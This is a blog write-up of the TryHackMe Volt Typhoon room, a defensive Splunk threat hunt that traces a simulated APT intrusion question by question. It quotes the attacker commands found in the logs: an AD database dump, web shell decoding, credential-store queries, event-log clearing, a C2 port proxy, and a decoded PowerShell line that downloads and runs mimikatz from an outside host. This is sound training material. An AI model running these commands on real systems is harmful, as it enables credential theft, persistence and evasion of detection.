---
layout: post
title: "TryHackMe: Volt Typhoon"
date: 2026-06-07
categories: [Writeups, TryHackMe]
tags: [splunk, volt-typhoon, apt, threat-hunting, spl, dfir, mitre-attack]
image: /assets/img/banners/VoltTyphoon.png
---

# Volt Typhoon TryHackMe Writeup

Volt Typhoon is a TryHackMe threat hunting room that puts you in the shoes of a SOC analyst investigating a compromised environment. The adversary is **Volt Typhoon** a Chinese state-sponsored APT group known for targeting critical infrastructure using living-off-the-land techniques. The investigation is conducted entirely through **Splunk**, analysing logs across WMIC, PowerShell, and ADSelfService sources.

---

## Question 1 Account Takeover Timestamp

> **Comb through the ADSelfService Plus logs to begin retracing the attacker's steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?**

We start by searching the ADSelfService Plus logs for any password change events linked to `dean-admin`.

**SPL Query:**
```spl
index=* source="/home/volthunter/logfiles/adss.log" username="dean-admin" "Password Change"
```

![ADSelfService Password Change](/assets/img/TryHackMe/VoltTyphoon/PasswordChange.png)

Two events are returned. The first on 3/29/24 shows a **failed** password change. The second on **3/24/24 at 11:10:22** shows a **completed** password change from IP `192.168.1.134`. This is the moment the attacker successfully took over Dean's account.

**Answer: `2024-03-24T11:10:22`**

---

## Question 2 New Administrator Account

> **Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?**

Using the timestamp of the compromised password change as a starting point, we search for enrollment events immediately after.

**SPL Query:**
```spl
index=** action_name=Enrollment
```

With the time range set to `Since 03/24/2024 11:10:22.000`:

![Enrollment Event](/assets/img/TryHackMe/VoltTyphoon/newaccount.png)

A single event is returned at **2024-03-24T11:12:26** showing an `Enrollment` action completed from `192.168.1.134` the same IP as the password change. The new account name is visible in the event.

**Answer: `voltyp-admin`**

---

## Question 3 Local Drive Enumeration

> **In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?**

Volt Typhoon is well documented for abusing `wmic` for living-off-the-land discovery. We search for `/node` WMIC commands run as `dean-admin`.

**SPL Query:**
```spl
index=* sourcetype=wmic username="dean-admin" "/node"
| table _time command
```

![WMIC Node Commands](/assets/img/TryHackMe/VoltTyphoon/info.png)

Seven events are returned. The highlighted entry at **2024-03-25 21:30:03** shows a disk enumeration command targeting both server01 and server02.

**Answer: `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename`**

---

## Question 4 NTDS Archive Password

> **The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?**

We broaden the search to all commands run by `dean-admin` containing `/c` to catch cmd.exe invocations.

**SPL Query:**
```spl
index=* username="dean-admin" "/c"
| table _time command
```

![NTDS Dump and Compression](/assets/img/TryHackMe/VoltTyphoon/copy.png)

The attack chain is visible across three events:

1. `ntdsutil.exe "ac i ntds" "ifm create full C:\Windows\Temp\tmp\temp.dit"` dumps the AD database
2. `xcopy C:\Windows\Temp\tmp\temp.dit \webserver-01\c$\inetpub\wwwroot` moves it to the web server
3. `7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit` compresses with a password

**Answer: `d5ag0nm@5t3r`**

---

## Question 5 Web Shell Directory

> **To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?**

MITRE ATT&CK maps Volt Typhoon to **T1505.003 Server Software Component: Web Shell**, with shells named `AuditReport.jspx` and `iisstart.aspx`.

![MITRE T1505.003](/assets/img/TryHackMe/VoltTyphoon/webshell1.png)

We first search for events referencing these filenames in PowerShell logs:

**SPL Query:**
```spl
index=* sourcetype=powershell "*AuditReport.jspx*" OR "*iisstart.aspx*"
```

![ntuser.ini encoded payload](/assets/img/TryHackMe/VoltTyphoon/webshell2.png)

The event on **3/28/24** shows: `certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx` decoding the web shell from a disguised `.ini` file into `iisstart.aspx`.

We then trace where the encoded payload came from:

**SPL Query:**
```spl
index=* sourcetype=powershell "C:\\Windows\\Temp\\ntuser.ini*"
```



A second event reveals a long Base64 blob being echoed directly into `C:\Windows\Temp\ntuser.ini` this is the encoded web shell being written to disk before decoding.

![Web Shell Decode confirmed](/assets/img/TryHackMe/VoltTyphoon/webshell3.png)

The web shell `iisstart.aspx` was placed in `C:\Windows\Temp\`.

**Answer: `C:\Windows\Temp`**

---

## Question 6 MRU Registry Removal

> **In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the "Most Recently Used" record?**

**SPL Query:**
```spl
index=* sourcetype=powershell "remove"
```

![Remove-ItemProperty](/assets/img/TryHackMe/VoltTyphoon/remove.png)

The event shows: `Remove-ItemProperty -Path $registryPath -Name MRU0 -ErrorAction SilentlyContinue` deleting MRU registry keys to erase evidence of recently accessed RDP connections.

**Answer: `Remove-ItemProperty`**

---

## Question 7 Archive Renamed

> **The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?**

**SPL Query:**
```spl
index=* "rename" OR "ren"
```

![Rename to cl64.gif](/assets/img/TryHackMe/VoltTyphoon/rename.png)

One event on **3/26/24 at 02:02:35** shows `cmd.exe /c ren \webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif` the attacker renames the compressed NTDS archive to a `.gif` file to disguise it as an image.

**Answer: `cl64.gif`**

---

## Question 8 Virtualisation Registry Check

> **Under what regedit path does the attacker check for evidence of a virtualized environment?**

**SPL Query:**
```spl
index=* sourcetype="powershell" CommandLine="Get-ItemProperty*"
```
The command found is: `Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*`

This queries a registry path and filters for any properties containing "Virtual" a common technique to detect sandbox or virtualised analysis environments.

![SPL Query for Get-ItemProperty](/assets/img/TryHackMe/VoltTyphoon/property2.png)

**Answer: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`**

---

## Question 9 Credential Hunting via Reg Query

> **Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate?**
> *Answer Format: Alphabetical order separated by a comma and space.*

MITRE ATT&CK T1555 documents Volt Typhoon targeting credential stores in OpenSSH, RealVNC, and PuTTY.

![T1555 MITRE](/assets/img/TryHackMe/VoltTyphoon/credentials1.png)

**OpenSSH:**
```spl
index=* openssh
```
![OpenSSH](/assets/img/TryHackMe/VoltTyphoon/credentials2.png)

`reg query hklm\software\OpenSSH\Agent` querying for stored OpenSSH keys.

**PuTTY:**
```spl
index=* "reg query*" AND "*putty*"
```
![PuTTY](/assets/img/TryHackMe/VoltTyphoon/credentials3.png)

`reg query hkcu\software\dean-admin\putty\session` enumerating saved PuTTY sessions.

**RealVNC:**
```spl
index=* "reg query*" AND "*realvnc*"
```
![RealVNC](/assets/img/TryHackMe/VoltTyphoon/credentials4.png)

`reg query hklm\software\realvnc\Allusers\vncserver` querying RealVNC configuration for stored credentials.

**Answer: `OpenSSH, PuTTY, RealVNC`**

---

## Question 10 Decoded Mimikatz Command

> **What is the full decoded command the attacker uses to download and run mimikatz?**

**SPL Query:**
```spl
index=* sourcetype="powershell" CommandLine="-exec"
```

![Encoded PowerShell](/assets/img/TryHackMe/VoltTyphoon/mimikatz1.png)

A heavily obfuscated PowerShell command is found using `-exec bypass -W hidden -nop -E <base64>`. The Base64 payload is extracted and decoded in CyberChef:

![CyberChef Decode](/assets/img/TryHackMe/VoltTyphoon/mimikatz2.png)

The decoded output is:

```powershell
Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait
```

**Answer: `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`**

---

## Question 11 Wevtutil Event IDs

> **The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?**
> *Answer Format: Increasing order separated by a space.*

MITRE T1654 documents Volt Typhoon using `wevtutil.exe` for log enumeration.

![T1654 MITRE](/assets/img/TryHackMe/VoltTyphoon/logs1.png)

**SPL Query:**
```spl
index=* "wevtutil*" OR "Get-EventLog security*"
```
12 events are returned. Examining the `wevtutil qe security` commands, three distinct Event IDs are queried:

![Event IDs](/assets/img/TryHackMe/VoltTyphoon/logs3.png)

- **4624** Successful logon
- **4625** Failed logon
- **4769** Kerberos Service Ticket request

**Answer: `4624 4625 4769`**

---

## Question 12 Lateral Movement Web Shell Name

> **Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?**

**SPL Query:**
```spl
index=* "iisstart.aspx" CommandLine="Copy-Item"
```

![Web Shell Copy to server-02](/assets/img/TryHackMe/VoltTyphoon/webshellcopy.png)

The event on **3/29/24 at 19:47:43** shows: `Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx"` the web shell is copied to server-02 under a new name.

**Answer: `AuditReport.jspx`**

---

## Question 13 Finance Files Collected

> **The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell?**
> *Answer Format: Increasing order separated by a space.*

**SPL Query:**
```spl
index=* CommandLine="Copy-Item" AND "*finance*"
```

![Finance CSV Collection](/assets/img/TryHackMe/VoltTyphoon/collection2.png)

Three events show files being staged from `C:\ProgramData\FinanceBackup\` to `C:\Windows\Temp\faudit\`:

- `Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv"` → `C:\Windows\Temp\faudit\2022.csv`
- `Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv"` → `C:\Windows\Temp\faudit\2023.csv`
- `Copy-Item -Path "C:\ProgramData\FinanceBackup\2024.csv"` → `C:\Windows\Temp\faudit\2024.csv`

**Answer: `2022.csv 2023.csv 2024.csv`**

---

## Question 14 C2 Proxy Address and Port

> **The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?**
> *Answer Format: IP Port*

MITRE T1112 documents Volt Typhoon using `netsh` for PortProxy registry modifications.

![T1112 MITRE](/assets/img/TryHackMe/VoltTyphoon/C2.png)

**SPL Query:**
```spl
index=** netsh
```

![netsh portproxy](/assets/img/TryHackMe/VoltTyphoon/c21.png)

The key event shows: `netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1` all inbound traffic on port 50100 is tunnelled to the C2 server.

**Answer: `10.2.30.1 8443`**

---

## Question 15 Event Logs Cleared

> **To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?**

Wevtutil is also documented by MITRE as a log-clearing tool under software entry **S0645**.

![S0645 Wevtutil](/assets/img/TryHackMe/VoltTyphoon/clear1.png)

**SPL Query:**
```spl
index=* "wevtutil cl"
```

![wevtutil cl command](/assets/img/TryHackMe/VoltTyphoon/clear2.png)

A single event at **3/29/24 22:04:23** shows: `wevtutil cl Application Security Setup System` clearing all four standard Windows event logs in one command.

**Answer: `Application, Security, Setup, System`**

---

## Key Takeaways

- Volt Typhoon relies almost entirely on **living-off-the-land binaries (LOLBins)**: `wmic`, `netsh`, `certutil`, `ntdsutil`, `7z`, `wevtutil`, and built-in PowerShell cmdlets making detection significantly harder.
- **ADSelfService Plus** was the initial foothold, exploited through credential abuse to take over a privileged account.
- Data was **staged locally and disguised** (renaming `.7z` to `.gif`) before exfiltration.
- **Log clearing was the final action**, underscoring the importance of real-time log forwarding to an external SIEM.
- Mapping observed activity to **MITRE ATT&CK** TTPs is essential for attribution and detection engineering.
